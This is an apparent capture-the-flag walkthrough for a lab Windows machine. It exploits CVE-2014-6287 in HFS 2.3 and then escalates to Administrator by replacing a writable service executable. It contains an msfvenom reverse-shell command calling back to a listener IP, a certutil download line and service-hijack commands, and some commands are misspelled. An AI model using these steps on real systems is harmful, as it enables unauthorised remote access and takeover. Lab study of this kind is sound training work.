# Introduction                            

In this room you will enumerate a Windows machine, gain initial access  with Metasploit, use Powershell to further enumerate the machine and  escalate your privileges to Administrator.

# Initial Access

## nmap

```shell
$ nmap -sC -sV -Pn -p- -T4 10.10.243.27
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 18:56 IST
Warning: 10.10.243.27 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.243.27
Host is up (0.16s latency).
Not shown: 65426 closed tcp ports (conn-refused), 94 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-04-13T14:07:38+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-04-12T12:46:49
|_Not valid after:  2022-10-12T12:46:49
|_ssl-date: 2022-04-13T14:07:44+00:00; +19m49s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49162/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:68:df:f0:5e:5d (unknown)
| smb2-time: 
|   date: 2022-04-13T14:07:37
|_  start_date: 2022-04-13T12:46:43
|_clock-skew: mean: 19m48s, deviation: 0s, median: 19m48s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required

```

-  **CVE-2014-6287** 

# Privilege Escalation

To enumerate this machine, we will  use a powershell script called PowerUp, that's purpose is to evaluate a  Windows machine and determine any abnormalities - "*PowerUp aims to be a clearinghouse of common Windows privilege escalation* *vectors that rely on misconfigurations.*"

You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Now you can use the **upload** command in Metasploit to upload the script.

![img](https://i.imgur.com/Zqipdba.png)

To execute this using Meterpreter, I will type **load powershell** into meterpreter. Then I will enter powershell by entering **powershell_shell**:

![img](https://i.imgur.com/1IEi13Y.png)                                                    

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an *unquoted service path* vulnerability?

![image-20220413213913165](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220413213913165.png)

The CanRestart option being true,  allows us to restart a service on the system, the directory to the  application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

![img](https://i.imgur.com/ieeJUME.png)

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.118.24 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```


To restart a service in Windows use the following command: `sc start <service path >`


```powershell
sc stop AdvancedSystemCareService9
copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\Advanced.exe"
```

![img](https://blog.razrsec.uk/content/images/2020/05/image-65.png)

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root. 

**Note:** The service showed up as being unquoted (and could be exploited using this  technique), however, in this case we have exploited weak file  permissions on the service files instead.

#  Access and Escalation Without Metasploit                            

Now let's complete the room without the use of Metasploit. 

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate 

To begin we shall be using the same CVE. However, this time let's use this [exploit.](https://www.exploit-db.com/exploits/39161)

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*

To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!

```shell
cirtutil -urlcache -f http://<ip>:<port> <file name>
python -m SimpelHTTServer 80
```



You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a  callback!                                                         

Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c. 

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also  running.

![img](https://i.imgur.com/OyEdJ27.png)

`powershell -c "Get-Service"`

Now let's escalate to Administrator with our new found knowledge. 

Generate your payload using msfvenom and pull it to the system using powershell. 

Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener!
